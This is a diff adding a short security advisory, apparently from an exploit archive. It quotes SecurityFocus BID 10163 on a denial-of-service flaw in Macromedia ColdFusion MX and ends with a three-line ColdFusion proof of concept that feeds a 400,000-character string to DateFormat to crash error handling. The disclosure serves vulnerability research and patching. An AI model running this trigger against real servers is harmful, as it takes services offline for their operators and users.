@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/10163/info
+
+A denial of service vulnerability has been reported in Macromedia ColdFusion MX that is reported to occur when the software attempts to write oversized error messages. These error messages will be logged by the server but may also be written into dynamically generated error pages.
+
+It is possible to trigger this condition remotely since remote users may influence the contents of error messages.
+
+<cfset
+longstr = RepeatString("1234567890123456789012345678901234567890", 10000)
+>
+<cfset the_date = #DateFormat(longstr)#>
+<cfoutput>#the_date#</cfoutput>
